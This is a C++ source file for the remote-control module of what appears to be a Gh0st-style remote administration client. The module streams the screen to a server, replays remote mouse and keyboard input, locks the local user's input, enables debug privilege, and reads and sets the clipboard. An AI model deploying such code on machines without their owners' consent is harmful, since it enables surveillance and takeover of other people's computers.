#include "pch.h"
#include "RemoteController.h"
#include"ProcessHelper.h"
#include"Common.h"
CRemoteController::CRemoteController(CIocpClient* IocpClient) :CManager(IocpClient)
{

	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//当前客户端扫描所有正在运行的进程信息


	m_IsBlockInput = FALSE;
	//申请ScreenSpy对象(抓图类)
	m_ScreenSpy = new CScreenSpy(16);


	m_ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendDataProcedure, this, 0, NULL);
	m_IsLoop = TRUE;
}

CRemoteController::~CRemoteController()
{
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);



	m_IsLoop = FALSE;

	WaitForSingleObject(m_ThreadHandle, INFINITE);
	if (m_ThreadHandle != NULL)
	{
		CloseHandle(m_ThreadHandle);
	}

	delete m_ScreenSpy;
	m_ScreenSpy = NULL;
	_tprintf(_T("~CRemoteController()\r\n"));
}

void CRemoteController::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();   //通知构造函数向下执行
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_CONTROL_REQUIRE:
	{

		BlockInput(FALSE);
		AnalyzeCommand(BufferData + 1, BufferLength - 1);
		BlockInput(m_IsBlockInput);

		break;

	}
	case CLIENT_REMOTE_CONTROLLER_BLOCK_INPUT_REQUIRE:
	{

		m_IsBlockInput = *(LPBYTE)&BufferData[1];   //鼠标键盘的锁定
		BlockInput(m_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD_REQUIRE:
	{
		SendClipboardData();
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_SET_CLIPBOARD_REQUIRE:
	{
		UpdateClipboardData((char*)BufferData + 1, BufferLength - 1);
		break;
	}
	}
}

DWORD WINAPI CRemoteController::SendDataProcedure(LPVOID ParameterData)
{
	CRemoteController* This = (CRemoteController*)ParameterData;

	This->SendBitmapInfo();

	//阻塞等待Server回传消息
	This->WaitingForDialogOpen();

	//第一帧桌面数据
	This->SendFirstData();

	while (This->m_IsLoop)
	{
		//循环发送桌面数据
		This->SendNextData();

		Sleep(10);
	}
	_tprintf(_T("CRemoteController::SendDataProcedure() 退出\r\n"));
	return 0;
}

VOID CRemoteController::SendBitmapInfo()
{
	//这里得到Bitmap结构的大小
	ULONG   BufferLength = 1 + m_ScreenSpy->GetBitmapInfoLength();   //大小
	LPBYTE	BufferData = (LPBYTE)VirtualAlloc(NULL,
		BufferLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	BufferData[0] = CLIENT_REMOTE_CONTROLLER_REPLY;
	//这里将bmp位图结构发送出去
	memcpy(BufferData + 1, m_ScreenSpy->GetBitmapInfo(), BufferLength - 1);
	m_IocpClient->OnSending((char*)BufferData, BufferLength);
	VirtualFree(BufferData, 0, MEM_RELEASE);
	return VOID();
}

VOID CRemoteController::SendFirstData()
{
	BOOL	IsOk = FALSE;
	LPVOID	BitmapData = NULL;

	//获得位图数据
	BitmapData = m_ScreenSpy->GetFirstScreenData();
	if (BitmapData == NULL)
	{
		return;
	}

	//构建
	ULONG	BufferLength = 1 + m_ScreenSpy->GetFirstScreenLength();
	LPBYTE	BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}

	BufferData[0] = CLIENT_REMOTE_CONTROLLER_FIRST_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);


	m_IocpClient->OnSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;
	return VOID();
}

VOID CRemoteController::SendNextData()
{
	LPVOID	BitmapData = NULL;
	ULONG	BufferLength = 0;
	BitmapData = m_ScreenSpy->GetNextScreenData(&BufferLength);

	if (BufferLength == 0 || BitmapData == NULL)
	{
		return;
	}
	//数据包头
	BufferLength += 1;

	LPBYTE	BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}
	BufferData[0] = CLIENT_REMOTE_CONTROLLER_NEXT_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);

	m_IocpClient->OnSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;
}

VOID CRemoteController::AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength)
{
	//数据包不合法
	if (BufferLength % sizeof(MSG) != 0)
	{
		return;
	}

	//命令个数
	ULONG	MsgCount = BufferLength / sizeof(MSG);

	//处理多个命令
	for (int i = 0; i < MsgCount; i++)   //1
	{
		MSG* Msg = (MSG*)(BufferData + i * sizeof(MSG));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT Point;
			Point.x = LOWORD(Msg->lParam);
			Point.y = HIWORD(Msg->lParam);
			SetCursorPos(Point.x, Point.y);
			SetCapture(WindowFromPoint(Point));  //???
		}
		break;
		default:
			break;
		}

		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0,
				GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
	return VOID();
}

VOID CRemoteController::SendClipboardData()
{
	//打开剪切板设备
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	HGLOBAL GlobalHandle = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (GlobalHandle == NULL)
	{
		CloseClipboard();
		return;
	}
	//通过剪切板句柄锁定数据内存
	int	  BufferLength = GlobalSize(GlobalHandle) + 1;
	char* v5 = (LPSTR)GlobalLock(GlobalHandle);
	LPBYTE	BufferData = new BYTE[BufferLength];


	BufferData[0] = CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD_REPLY;
	memcpy(BufferData + 1, v5, BufferLength - 1);
	::GlobalUnlock(GlobalHandle);
	::CloseClipboard();
	m_IocpClient->OnSending((char*)BufferData, BufferLength);
	delete[] BufferData;
	return VOID();
}

VOID CRemoteController::UpdateClipboardData(char* BufferData, ULONG BufferLength)
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	//清空剪贴板数据内容
	::EmptyClipboard();
	//申请内存
	HGLOBAL GlobalHandle = GlobalAlloc(GPTR, BufferLength);
	if (GlobalHandle != NULL) {

		//锁定物理页面
		char* v5 = (LPTSTR)GlobalLock(GlobalHandle);
		memcpy(v5, BufferData, BufferLength);
		GlobalUnlock(GlobalHandle);

		SetClipboardData(CF_TEXT, GlobalHandle);
		GlobalFree(GlobalHandle);
	}
	CloseClipboard();
	return VOID();
}
